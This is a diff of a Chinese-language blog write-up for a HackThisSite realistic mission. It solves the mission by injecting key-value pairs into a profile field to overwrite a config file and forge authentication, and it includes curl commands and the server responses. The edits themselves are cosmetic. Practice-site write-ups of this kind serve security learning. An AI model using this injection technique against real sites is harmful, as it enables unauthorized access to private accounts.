@@ -30,7 +30,7 @@
 <meta property="og:description" content="Challenge  One of your best friends has reason to believe that his girlfriend has been cheating on him. He thinks that she&#39;s been sending emails back and forth with this other guy, but he has no for s">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-09-12T15:29:01.000Z">
-<meta property="article:modified_time" content="2026-09-12T15:29:01.675Z">
+<meta property="article:modified_time" content="2026-09-15T02:01:49.115Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="arbitrary-file-write">
 <meta property="article:tag" content="ctf">
@@ -243,18 +243,18 @@ check_email.swf，拿到邮箱查询端点</span></a></li><li class="nav-item na
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">409</span>
+          <span class="site-state-item-count">532</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">265</span>
+        <span class="site-state-item-count">348</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -324,6 +324,13 @@ check_email.swf，拿到邮箱查询端点</span></a></li><li class="nav-item na
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-15 10:01:49" itemprop="dateModified" datetime="2026-09-15T10:01:49+08:00">2026-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
       </span>
       <span class="post-meta-item-text">In</span>
@@ -385,8 +392,8 @@ Login），是隐藏入口。</li>
 <li>首页新闻有一条 "Registration Error"：<em>"we were having a problem
 with people registering who tried to use special characters in their
 name... it might take up to a week to fix. For now, we suggest sticking
-to just letters and numbers in your email address."</em> ——
-等于明说用户名没做过滤，特殊字符能进名字。</li>
+to just letters and numbers in your email
+address."</em>，等于明说用户名没做过滤，特殊字符能进名字。</li>
 </ul>
 <h4 id="step-1-反编译-login.swf-看清认证信任链">Step 1: 反编译 login.swf
 看清认证信任链</h4>
@@ -428,13 +435,13 @@ cookie）：</p>
 <code>Logged in as: ..@simplemail.com</code>。编辑资料表单的字段是
 <code>message</code> / <code>curr_email</code> /
 <code>timezone</code>，POST 到 <code>edit.php</code>。用户配置的第 1
-行就是 personal message，把 payload 塞进 <code>message</code>：</p>
+行就是 personal message，把 payload 写入 <code>message</code>：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -i -b <span class="string">&quot;HackThisSite=&lt;mission-cookie&gt;&quot;</span> \</span><br><span class="line">    --data-urlencode <span class="string">&#x27;message=auth_page=config.txt&amp;authed=true&amp;&#x27;</span> \</span><br><span class="line">    --data-urlencode <span class="string">&#x27;curr_email=attacker@localhost&#x27;</span> \</span><br><span class="line">    --data-urlencode <span class="string">&#x27;timezone=0&#x27;</span> \</span><br><span class="line">    <span class="string">&quot;https://www.hackthissite.org/missions/realistic/16/edit.php&quot;</span></span><br><span class="line">HTTP/2 302</span><br><span class="line">location: index.php?module=edit_success</span><br></pre></td></tr></table></figure>
 <p>根 <code>config.txt</code> 变成：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">auth_page=config.txt&amp;authed=true&amp;;</span><br><span class="line">0;</span><br><span class="line">attacker@localhost;</span><br><span class="line"></span><br><span class="line">\\These is the user config file notes, anything with \\ in front is ignored</span><br><span class="line">\\Line 1: Personal message</span><br><span class="line">\\Line 2: Timezone</span><br><span class="line">\\Line 3: Current Email</span><br></pre></td></tr></table></figure>
 <p>payload 的作用：把 <code>auth_page</code> 指回
-<code>config.txt</code> 自己，并塞进 <code>authed=true</code>。末尾那个
-<code>&amp;</code> 是关键——它把后面的 <code>;</code> 和其余各行从
+<code>config.txt</code> 自己，并写入 <code>authed=true</code>。末尾那个
+<code>&amp;</code> 是关键：它把后面的 <code>;</code> 和其余各行从
 <code>authed</code> 的值里切断（<code>loadVariables</code> 按
 <code>&amp;</code> 分键值对，没有 <code>&amp;</code> 的话
 <code>authed</code> 会变成
@@ -470,7 +477,7 @@ SWF 里硬编码的服务端脚本
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b <span class="string">&quot;HackThisSite=&lt;mission-cookie&gt;&quot;</span> \</span><br><span class="line">    <span class="string">&quot;https://www.hackthissite.org/missions/realistic/16/check_email.php?auth=true&amp;id=63a4bf12cd&amp;email=jenn%40simplemail.com&quot;</span></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;title&gt;Unauthorized Entry&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Unauthorized Entry Attempt&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You have incorrectly attempted to login to administrative area using an incorrect username and or password. This attempt has been logged.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 <p><code>auth=true</code> 和 <code>id=63a4bf12cd</code>
 只是客户端参数，服务端真正读的是 <code>config.txt</code>
-指向的认证页——根因不修，端点永远回 Unauthorized。这就是覆盖
+指向的认证页。根因不修，端点永远回 Unauthorized。这就是覆盖
 <code>config.txt</code> 必须在前的原因。</p>
 <h4 id="step-5-读取-jenn-的邮件并通关">Step 5: 读取 jenn
 的邮件并通关</h4>
